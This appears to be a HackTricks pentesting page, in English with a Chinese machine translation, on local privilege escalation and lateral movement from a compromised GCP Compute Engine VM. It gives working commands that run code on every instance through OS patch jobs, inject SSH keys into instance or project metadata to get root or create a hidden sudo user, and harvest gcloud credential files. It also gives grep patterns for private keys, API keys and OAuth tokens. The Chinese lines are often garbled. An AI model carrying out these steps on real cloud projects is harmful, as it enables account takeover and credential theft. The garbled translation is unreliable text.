

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


in this scenario we are going to suppose that you **have compromised a non privilege account** inside a VM in a Compute Engine project.

在这种情况下，我们将假设您**在计算引擎项目中的VM中损害了一个非特权帐户**。

Amazingly, GPC permissions of the compute engine you have compromised may help you to **escalate privileges locally inside a machine**. Even if that won't always be very helpful in a cloud environment, it's good to know it's possible.

令人惊讶的是，您所妥协的计算引擎的GPC权限可能会帮助您**在机器内部升级特权**。 即使在云环境中并不总是很有帮助，也很高兴知道这是可能的。

# OS Patching

＃OS修补
Depending on the privileges associated with the service account you have access to, if it has either the `osconfig.patchDeployments.create` or `osconfig.patchJobs.exec` permissions you can create a [patch job or deployment](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching). This will enable you to move laterally in the environment and gain code execution on all the compute instances within a project.

取决于与您可以访问的服务帐户相关的特权，如果它具有`osconfig.patchdeployments.create`或osconfig.patchjobs.exec`权限了，则可以创建[补丁作业或部署]（https：// https：// blog.raphael.karger.is/articles/2022-08/gcp-os-patching）。 这将使您能够在环境中横向移动，并在项目中的所有计算实例上获得代码执行。

First check all the roles the account has:

首先检查帐户具有的所有角色：

`gcloud iam roles list`

Now check the permissions offered by the role, if it has access to either the patch deployment or job continue.

现在检查角色提供的权限，如果它可以继续使用补丁部署或工作继续。

`gcloud iam roles describe roles/<role name> | grep -E '(osconfig.patchDeployments.create|osconfig.patchJobs.exec)'`


If you want to manually exploit this you will need to create either a [patch job](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch_job.json) or [deployment](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch_deployment.json) for a patch job run:

如果要手动利用此功能，则需要创建[PATCH obs]（https://github.com/rek7/patchy/patchy/blob/main/pkg/engine/patches/patches/patch_job.json）或[部署]（部署）（ https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch_deployment.json）用于补丁作业运行：

`gcloud compute os-config patch-jobs execute --file=patch.json`

`gcloud compute os-config patch-jobs execute --file=patch.json`


To deploy a patch deployment:

`gcloud compute os-config patch-deployments create my-update --file=patch.json`

`gcloud Compute OS-Config Patch-Deployments创建My-Update -file = Patch.json```

Automated tooling such as [patchy](https://github.com/rek7/patchy) exists to detect lax permissions and automatically move laterally.

存在自动化工具，例如[PATDY]（https://github.com/rek7/patchy），以检测LAX权限并自动横向移动。

# Read the scripts <a href="#follow-the-scripts" id="follow-the-scripts"></a>

＃阅读脚本<a href="#follow-the-scripts" id="follow-the-scripts"> </a>

**Compute Instances** are probably there to **execute some scripts** to perform actions with their service accounts.

**计算实例**可能在那里**执行一些脚本**以使用其服务帐户执行操作。

As IAM is go granular, an account may have **read/write** privileges over a resource but **no list privileges**.

由于IAM是颗粒状的，因此帐户可能具有**读/写**特权，但**无列表特权**。

A great hypothetical example of this is a Compute Instance that has permission to read/write backups to a storage bucket called `instance82736-long-term-xyz-archive-0332893`.

一个很好的假设示例是一个计算实例，该实例有权读取/写入备份到称为“ instance82736长的term-xyz-xyz-archive-0332893”的存储桶。

Running `gsutil ls` from the command line returns nothing, as the service account is lacking the `storage.buckets.list` IAM permission. However, if you ran `gsutil ls gs://instance82736-long-term-xyz-archive-0332893` you may find a complete filesystem backup, giving you clear-text access to data that your local Linux account lacks.

从命令行中运行`gsutil ls'都没有返回，因为服务帐户缺少`socale.buckets.list` iam iam jiam''。 但是，如果您运行`gsutil ls gs：// instance82736-long-term-xyz-xyz-archive-0332893``您可能会找到一个完整的文件系统备份，使您可以清晰地访问本地Linux帐户所缺乏的数据。

You may be able to find this bucket name inside a script (in bash, Python, Ruby...).

您也许可以在脚本中找到此存储桶名称（在Bash，Python，Ruby ...）。

# Custom Metadata

Administrators can add [custom metadata](https://cloud.google.com/compute/docs/storing-retrieving-metadata#custom) at the instance and project level. This is simply a way to pass **arbitrary key/value pairs into an instance**, and is commonly used for environment variables and startup/shutdown scripts.

管理员可以在实例和项目级别添加[自定义元数据]（https://cloud.google.com/compute/compute/compute/compute/compute/compute/storing-retrieving-metadata#custom）。 这只是将**任意键/值对传递到实例**的一种方法，通常用于环境变量和启动/关闭脚本。

```bash
# view project metadata
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"

# view instance metadata
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"
```

# Modifying the metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

＃修改元数据<a href="#modifying-the-metadata" id="modifying-the-metadata"> </a>

If you can **modify the instance's metadata**, there are numerous ways to escalate privileges locally. There are a few scenarios that can lead to a service account with this permission:

如果您可以**修改实例的元数据**，则有许多方法可以在本地升级特权。 有一些方案可以在此许可下导致服务帐户：

_**Default service account**_\

_ **默认服务帐户** _ \
If the service account access **scope** is set to **full access** or at least is explicitly allowing **access to the compute API**, then this configuration is **vulnerable** to escalation. The **default** **scope** is **not** **vulnerable**.

如果服务帐户访问**范围**设置为**完整访问**或至少明确允许**访问计算API **，则此配置是**易受攻击**升级。 **默认** **范围**不是** ** **脆弱**。

_**Custom service account**_\

_ **自定义服务帐户** _ \
When using a custom service account, **one** of the following IAM permissions **is** **necessary** to escalate privileges:

使用自定义服务帐户时，**一个**以下IAM许可** ** **是必要的**以升级特权：

* `compute.instances.setMetadata` (to affect a single instance)

*`compute.instances.setMetadata`（影响一个实例）
* `compute.projects.setCommonInstanceMetadata` (to affect all instances in the project)

*`compute.projects.setcommoninstancemetadata`（影响项目中的所有实例）

Although Google [recommends](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance) not using access scopes for custom service accounts, it is still possible to do so. You'll need one of the following **access scopes**:

虽然Google [推荐]（https://cloud.google.com/compute/docs/access/service-accounts#associating \ _a \ _service__account \ _account \ _to \ _an \ _instance）不使用自定义服务帐户的访问范围 仍然可以这样做。 您需要以下**访问范围**：

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platfo`rm

## **Add SSH keys to custom metadata**

**Linux** **systems** on GCP will typically be running [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) scripts. One of these is the [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), which **periodically** **queries** the instance metadata endpoint for **changes to the authorized SSH public keys**.

** linux ** **系统** GCP上的系统**通常会运行[python linux Guest for Google Compente Engine]（https://github.com/googleclecleclecloodplatform/compute-compute-image-image-image-packages/tree/master/master/master/packages/ppackages/python -google-compute-engine＃帐户）脚本。 其中之一是[account守护程序]（https://github.com/googleclecloudplatform/compute-image-packages/tree/master/master/packages/python-google-compute-compute-engine-engine#accounts ）， *查询**实例元数据端点**更改授权的SSH公共密钥**。

**If a new public** key is encountered, it will be processed and **added to the local machine**. Depending on the format of the key, it will either be added to the `~/.ssh/authorized_keys` file of an **existing user or will create a new user with `sudo` rights**.

**如果遇到了新的公共**密钥，将处理并添加到本地计算机**。 根据密钥的格式，将其添加到**现有用户的“〜/.ssh/euthorized_keys”文件中，或者将使用``sudo'''权利**创建新用户。

So, if you can **modify custom instance metadata** with your service account, you can **escalate** to root on the local system by **gaining SSH rights** to a privileged account. If you can modify **custom project metadata**, you can **escalate** to root on **any system in the current GCP project** that is running the accounts daemon.

因此，如果您可以使用您的服务帐户修改自定义实例元数据**，则可以通过**获得SSH权限**升级**在本地系统上扎根。 如果您可以修改**自定义项目元数据**，则可以**升级**扎根于当前GCP项目中的任何系统**正在运行帐户守护程序的任何系统。

## **Add SSH key to existing privileged user**

## **将SSH密钥添加到现有特权用户**

Let's start by adding our own key to an existing account, as that will probably make the least noise.

首先，让我们将自己的密钥添加到现有帐户中，因为这可能会使噪音最少。

**Check the instance for existing SSH keys**. Pick one of these users as they are likely to have sudo rights.

**检查现有SSH键的实例**。 选择这些用户之一，因为他们可能拥有Sudo权利。

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```

Look for a section like the following:

寻找以下部分：

```
 ...
 metadata:
   fingerprint: QCZfVTIlKgs=
   items:
   ...
   - key: ssh-keys
     value: |-
       alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
       bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
 ...
```

Notice the **slightly odd format** of the public keys - the **username** is listed at the **beginning** (followed by a colon) and then again at the **end**. We'll need to match this format. Unlike normal SSH key operation, the username absolutely matters!

请注意，公共钥匙的**略微奇数格式 -  **用户名**在**开始**（接着是结肠），然后在** end **再次列出。 我们需要匹配此格式。 与普通的SSH密钥操作不同，用户名绝对重要！

**Save the lines with usernames and keys in a new text** file called `meta.txt`.

**将用户名和键保存在新的文本**文件中，称为“ meta.txt”。

Let's assume we are targeting the user `alice` from above. We'll **generate a new key** for ourselves like this:

假设我们是从上面定位的“爱丽丝”。 我们会**为自己生成一个新密钥**：

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```

Add your new public key to the file `meta.txt` imitating the format:

将新的公共密钥添加到文件`meta.txt`模仿格式：

```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```

Now, you can **re-write the SSH key metadata** for your instance with the following command:

现在，您可以**重写SSH密钥元数据**用于您的实例，并使用以下命令：

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

You can now **access a shell in the context of `alice`** as follows:

您现在可以**在“爱丽丝”的上下文中访问外壳**如下：

```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```

## **Create a new privileged user and add a SSH key**

## **创建一个新的特权用户并添加SSH键**

No existing keys found when following the steps above? No one else interesting in `/etc/passwd` to target?

遵循上述步骤时没有发现现有的键？ 在“/etc/passwd”中，没有其他人有趣的目标吗？

You can **follow the same process** as above, but just **make up a new username**. This user will be created automatically and given rights to `sudo`. Scripted, the process would look like this:

您可以**遵循与上述相同的过程**，但只需**组成一个新的用户名**。 该用户将自动创建并授予“ sudo”的权利。 脚本，该过程看起来像这样：

```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```

## **Grant sudo to existing session**

## **将sudo授予现有会话**

This one is so easy, quick, and dirty that it feels wrong…

这个是如此简单，快速和肮脏，感觉不错……

```
gcloud compute ssh [INSTANCE NAME]
```

This will **generate a new SSH key, add it to your existing user, and add your existing username to the `google-sudoers` group**, and start a new SSH session. While it is quick and easy, it may end up making more changes to the target system than the previous methods.

这将**生成一个新的SSH键，将其添加到现有用户中，并将现有用户名添加到“ Google-Sudoers”组**中，然后启动新的SSH会话。 虽然快速简便，但最终可能比以前的方法对目标系统进行更改。

## SSH keys at project level <a href="#sshing-around" id="sshing-around"></a>

## ssh键在项目级<a href="#sshing-around" id="sshing-around"> </a>

Following the details mentioned in the previous section you can try to compromise more VMs.

遵循上一节中提到的详细信息，您可以尝试妥协更多的VM。

We can expand upon those a bit by [**applying SSH keys at the project level**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide), granting you permission to **SSH into a privileged account** for any instance that has not explicitly chosen the "Block project-wide SSH keys" option.:

我们可以通过[**在项目级别上应用SSH键]（https://cloud.google.com/compute/compute/compute/docs/adding-removing-ssh-keys#project）来对其进行一些扩展。 ，授予您允许** ssh进入特权帐户**，以供任何尚未明确选择“块范围范围内的SSH键”选项。

```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

If you're really bold, you can also just type `gcloud compute ssh [INSTANCE]` to use your current username on other boxes.

如果您真的大胆，也可以键入`gcloud compute ssh [instance]`以在其他盒子上使用当前的用户名。

# **Using OS Login**

[**OS Login**](https://cloud.google.com/compute/docs/oslogin/)  is an alternative to managing SSH keys. It links a **Google user or service account to a Linux identity**, relying on IAM permissions to grant or deny access to Compute Instances.

[** OS登录**]（https://cloud.google.com/compute/docs/oslogin/）是管理SSH键的替代方法。 它依赖于IAM权限授予或拒绝访问计算实例的IAM权限，将** Google用户或服务帐户链接到Linux Identity **。

OS Login is [enabled](https://cloud.google.com/compute/docs/instances/managing-instance-access#enable\_oslogin) at the project or instance level using the metadata key of `enable-oslogin = TRUE`.

OS登录为[enabled]（https://cloud.google.com/compute/docs/instances/managing-instance-instance-access-access-access-enable_oslogin）在项目或实例级别使用`eNable-oslogin = true的元数据级 `

OS Login with two-factor authentication is [enabled](https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication) in the same manner with the metadata key of `enable-oslogin-2fa = TRUE`.

带有两局部身份验证的OS登录名（https://cloud.google.com/compute/compute/oslogin/setup-two-factor-authentication）以`eNable-oslogin-- 2fa = true`。

The following two **IAM permissions control SSH access to instances with OS Login enabled**. They can be applied at the project or instance level:

以下两个** IAM权限控制SSH访问具有OS登录名的实例**。 它们可以在项目或实例级别应用：

* **compute.instances.osLogin** (no sudo)
* **compute.instances.osAdminLogin** (has sudo)

Unlike managing only with SSH keys, these permissions allow the administrator to control whether or not `sudo` is granted.

与仅使用SSH密钥管理不同，这些权限允许管理员控制是否授予“ sudo”。

If your service account has these permissions. **You can simply run the `gcloud compute ssh [INSTANCE]`** command to [connect manually as the service account](https://cloud.google.com/compute/docs/instances/connecting-advanced#sa\_ssh\_manual). **Two-factor** is **only** enforced when using **user accounts**, so that should not slow you down even if it is assigned as shown above.

如果您的服务帐户具有这些权限。 **您可以简单地运行`gcloud compute ssh [instance]`**命令到[作为服务帐户手动连接]（https：//cloud.google.com/compute/compute/docs/instances/connecting-advanced#sa \ sa \ sa _ssh \ _ manual）。 **两因素**仅在使用**用户帐户**时被强制执行**，因此即使分配了如上图所示，也不应该放慢速度。

Similar to using SSH keys from metadata, you can use this strategy to **escalate privileges locally and/or to access other Compute Instances** on the network.

类似于使用元数据中的SSH键，您可以使用此策略来**在本地升级特权和/或访问网络上的其他计算实例**。

# Search for Keys in the filesystem

＃在文件系统中搜索密钥

It's quite possible that **other users on the same box have been running `gcloud`** commands using an account more powerful than your own. You'll **need local root** to do this.

**同一框上的其他用户很有可能使用比您自己功能更强大的帐户运行`gcloud'**命令。 您将**需要本地根**来做到这一点。

First, find what `gcloud` config directories exist in users' home folders.

首先，查找用户主文件夹中的“ gcloud”配置目录。

```
sudo find / -name "gcloud"
```

You can manually inspect the files inside, but these are generally the ones with the secrets:

您可以手动检查内部的文件，但通常是秘密的文件：

* \~/.config/gcloud/credentials.db
* \~/.config/gcloud/legacy\_credentials/\[ACCOUNT]/adc.json
* \~/.config/gcloud/legacy\_credentials/\[ACCOUNT]/.boto

* \〜/.config/gcloud/legacy \ _credentials/\ [account]/。boto
* \~/.credentials.json

Now, you have the option of looking for clear text credentials in these files or simply copying the entire `gcloud` folder to a machine you control and running `gcloud auth list` to see what accounts are now available to you.

现在，您可以选择在这些文件中查找清晰的文本凭据，或者简单地将整个``gcloud''文件夹复制到您控制的计算机并运行`gcloud auth list`以查看现在可用的帐户。

## More API Keys regexes

##更多API键

```bash
TARGET_DIR="/path/to/whatever"

# Service account keys
grep -Pzr "(?s){[^{}]*?service_account[^{}]*?private_key.*?}" \
    "$TARGET_DIR"

# Legacy GCP creds
grep -Pzr "(?s){[^{}]*?client_id[^{}]*?client_secret.*?}" \
    "$TARGET_DIR"

# Google API keys
grep -Pr "AIza[a-zA-Z0-9\\-_]{35}" \
    "$TARGET_DIR"

# Google OAuth tokens
grep -Pr "ya29\.[a-zA-Z0-9_-]{100,200}" \
    "$TARGET_DIR"

# Generic SSH keys
grep -Pzr "(?s)-----BEGIN[ A-Z]*?PRIVATE KEY[a-zA-Z0-9/\+=\n-]*?END[ A-Z]*?PRIVATE KEY-----" \
    "$TARGET_DIR"

# Signed storage URLs
grep -Pir "storage.googleapis.com.*?Goog-Signature=[a-f0-9]+" \
    "$TARGET_DIR"

# Signed policy documents in HTML
grep -Pzr '(?s)<form action.*?googleapis.com.*?name="signature" value=".*?">' \
    "$TARGET_DIR"
```


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


